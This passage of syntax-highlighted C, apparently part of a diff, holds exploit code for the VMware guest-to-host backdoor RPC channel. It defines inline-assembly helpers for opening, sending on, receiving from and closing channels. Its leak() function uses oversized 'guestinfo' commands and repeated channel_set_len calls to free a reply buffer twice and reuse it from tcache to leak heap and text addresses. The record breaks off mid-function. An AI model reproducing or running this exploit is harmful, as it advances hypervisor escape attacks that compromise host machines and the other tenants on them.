+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>
+        <span class="token string">"movq %%rcx,%%r10\n\t"</span>
+        <span class="token string">"movq $0x1,%%rbx\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>
+        <span class="token string">"movw $0x5658,%%dx\n\t"</span>
+        <span class="token string">"out %%eax,%%dx\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>
+       <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>
+        <span class="token string">"movq %%rcx,%%r10\n\t"</span>
+        <span class="token string">"movq $0x21,%%rbx\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>
+        <span class="token string">"movw $0x5658,%%dx\n\t"</span>
+        <span class="token string">"out %%eax,%%dx\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>
+       <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>
+        <span class="token string">"movq %%rcx,%%r10\n\t"</span>
+        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>
+        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>
+        <span class="token string">"movw $0x5658,%%dx\n\t"</span>
+        <span class="token string">"out %%eax,%%dx\n\t"</span>
+        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span>
+        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>
+       <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> num<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
+    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>  
+    <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s21<span class="token operator">=</span> <span class="token string">"info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>
+    <span class="token comment">//init data</span>
+    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>
+    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//first step </span>
+    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//strlen(s21) = 0x100</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//second step free the reply and let the other channel get it.</span>
+
+    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">//free the output buffer</span>
+    <span class="token comment">//printf("Freeing the buffer....,bp:0x5555556DD3EF\n");</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now let's free\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then alloc channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//finished sending the command, should get the freed buffer</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check if channel 1's buffer == channel 0's buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//third step,free it again</span>
+    <span class="token comment">//set status to be 4</span>
+
+    <span class="token comment">//free the output buffer</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check the heap, our target buffer in tcache now!\nTrying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>
+    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
